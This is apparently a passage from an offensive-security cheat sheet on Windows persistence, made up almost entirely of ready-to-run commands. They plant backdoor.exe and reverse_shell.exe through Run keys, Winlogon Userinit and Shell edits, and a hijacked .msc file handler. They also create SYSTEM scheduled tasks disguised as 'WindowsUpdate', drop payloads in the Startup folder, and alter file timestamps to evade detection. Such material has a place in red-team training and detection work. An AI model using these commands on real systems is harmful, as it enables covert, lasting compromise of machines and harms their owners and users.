!!! tip "Tip"
    Scheduled tasks with `SYSTEM` privileges are powerful but logged. Use `schtasks /create /tn "WindowsUpdate" /tr "cmd.exe /c ..." /sc onlogon /ru SYSTEM` and name the task to blend in with legitimate tasks.

### Registry Manipulation for Persistence

#### Common Persistence Keys

```bash
HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run
HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run
HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce
HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce
HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run
HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit
HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Shell
```

#### Adding a Malicious Payload to Registry

```powershell
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v Backdoor /t REG_SZ /d "C:\Users\Public\backdoor.exe" /f
```

- This command ensures `backdoor.exe` will execute every time the user logs in.
    

#### Hiding a Malicious Executable in Registry

```powershell
reg add "HKCU\Software\Classes\mscfile\shell\open\command" /t REG_SZ /d "C:\Users\Public\reverse_shell.exe" /f
```

- This will execute `reverse_shell.exe` when an `.msc` file is opened.
    

#### Modifying Userinit for Persistent Backdoor

```powershell
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Userinit /t REG_SZ /d "C:\Windows\System32\userinit.exe, C:\backdoor.exe" /f
```

- Runs `backdoor.exe` at every login.
    

#### Modifying Shell for Persistent Access

```powershell
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Shell /t REG_SZ /d "explorer.exe, C:\malicious.exe" /f
```

- Executes `malicious.exe` alongside `explorer.exe` on user login.
    

---
### Scheduled Task Manipulation for Persistence

Windows Task Scheduler can be used to create persistence by running malicious scripts or binaries at scheduled intervals.

#### Creating a Malicious Scheduled Task

```powershell
schtasks /create /tn "WindowsUpdate" /tr "C:\Users\Public\backdoor.exe" /sc ONLOGON /ru SYSTEM
```

- Runs `backdoor.exe` every time the system starts.
    

#### Listing Existing Scheduled Tasks

```powershell
schtasks /query /fo LIST /v
```

- Shows detailed task information, including hidden scheduled tasks.
    

#### Modifying an Existing Scheduled Task for Persistence

```powershell
schtasks /change /tn "BackupTask" /tr "C:\Users\Public\reverse_shell.exe"
```

- Replaces an existing task’s executable with a malicious one.
    

#### Deleting a Suspicious Scheduled Task

```powershell
schtasks /delete /tn "WindowsUpdate" /f
```

- Removes the scheduled persistence task.
    

#### Abusing At for Scheduled Execution

```powershell
at 15:30 /interactive C:\Users\Public\malware.exe
```

- Executes `malware.exe` at 3:30 PM interactively.
    

---
### Startup Folder Persistence

Another way to establish persistence is by dropping a malicious executable or script in the Startup folder, which executes on every reboot.

#### Finding Startup Folder Paths

```powershell
echo %APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup
```

#### Dropping a Payload in the Startup Folder

```powershell
copy backdoor.exe %APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\
```

- Runs `backdoor.exe` when the user logs in.
    

---
### Defensive Evasion - Modifying TimeStamps

After modifying persistence mechanisms, an attacker can use timestamp manipulation to evade detection.

#### Changing File Creation & Modification Timestamps

```powershell
powershell -c "$(Get-Item C:\Users\Public\malware.exe).LastWriteTime=('01/01/2021 12:00:00 PM')"
```

- Modifies the last modified timestamp to blend with legitimate system files.